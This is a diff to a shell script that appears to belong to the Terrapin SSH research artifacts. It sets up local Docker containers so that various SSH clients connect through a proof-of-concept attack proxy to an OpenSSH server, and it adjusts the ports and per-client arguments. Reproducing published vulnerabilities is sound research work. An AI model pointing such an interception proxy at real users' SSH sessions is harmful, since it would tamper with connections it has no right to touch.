@@ -3,9 +3,10 @@
 SERVER_IMPL_NAME="OpenSSH 9.5p1"
 SERVER_IMAGE="terrapin-artifacts/openssh-server:9.5p1"
 SERVER_CONTAINER_NAME="terrapin-artifacts-server"
-SERVER_PORT=2222
+SERVER_PORT=2200
 
 POC_CONTAINER_NAME="terrapin-artifacts-poc"
+POC_PORT=2201
 
 CLIENT_CONTAINER_NAME="terrapin-artifacts-client"
 
@@ -60,7 +61,7 @@ function select_and_run_poc_proxy {
     --rm \
     --network host \
     --name $POC_CONTAINER_NAME \
-    $POC_IMAGE --server-ip "127.0.0.1" --server-port 2222 -N $DECREASE_INCREASE_BY &
+    $POC_IMAGE --proxy-port $POC_PORT --server-ip "127.0.0.1" --server-port $SERVER_PORT -N $DECREASE_INCREASE_BY &
   sleep 5
 }
 
@@ -77,39 +78,39 @@ function select_and_run_client {
   case $CLIENT_IMPL in
     1)
       CLIENT_IMPL_NAME="AsyncSSH 2.13.2"
-      CLIENT_IMAGE="terrapin-artifacts/asyncssh-client:2.13.2" ;;
+      CLIENT_IMAGE="terrapin-artifacts/asyncssh-client:2.13.2"
+      ARGS="--host 127.0.0.1 --port $POC_PORT --username victim" ;;
     2)
       CLIENT_IMPL_NAME="Dropbear 2022.83"
-      CLIENT_IMAGE="terrapin-artifacts/dropbear-client:2022.83" ;;
+      CLIENT_IMAGE="terrapin-artifacts/dropbear-client:2022.83"
+      ARGS="-p $POC_PORT victim@127.0.0.1" ;;
     3)
       CLIENT_IMPL_NAME="libssh 0.10.5"
-      CLIENT_IMAGE="terrapin-artifacts/libssh-client:0.10.5" ;;
+      CLIENT_IMAGE="terrapin-artifacts/libssh-client:0.10.5" 
+      ARGS="-p $POC_PORT victim@127.0.0.1" ;;
     4)
       CLIENT_IMPL_NAME="OpenSSH 9.4p1"
-      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.4p1" ;;
+      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.4p1"
+      ARGS="-p $POC_PORT victim@127.0.0.1" ;;
     5)
       CLIENT_IMPL_NAME="OpenSSH 9.5p1"
-      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.5p1" ;;
+      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.5p1"
+      ARGS="-p $POC_PORT victim@127.0.0.1" ;;
     6)
       CLIENT_IMPL_NAME="PuTTY 0.79"
-      CLIENT_IMAGE="terrapin-artifacts/putty-client:0.79" ;;
+      CLIENT_IMAGE="terrapin-artifacts/putty-client:0.79"
+      ARGS="-P $POC_PORT victim@127.0.0.1" ;;
     *)
       echo "[!] Invalid selection, please re-run the script"
       exit 1 ;;
   esac
   echo "[+] Selected client implementation: '$CLIENT_IMPL_NAME'"
 
-  if [ ! $CLIENT_IMPL -eq 1 ]; then
-    EXTRA_ARGS="victim@127.0.0.1"
-  else
-    EXTRA_ARGS=""
-  fi
-
   docker run \
     --rm \
     --network host \
     --name $CLIENT_CONTAINER_NAME \
-    $CLIENT_IMAGE $EXTRA_ARGS
+    $CLIENT_IMAGE $ARGS
   echo "[+] Client terminated, PoC done"
 }
 
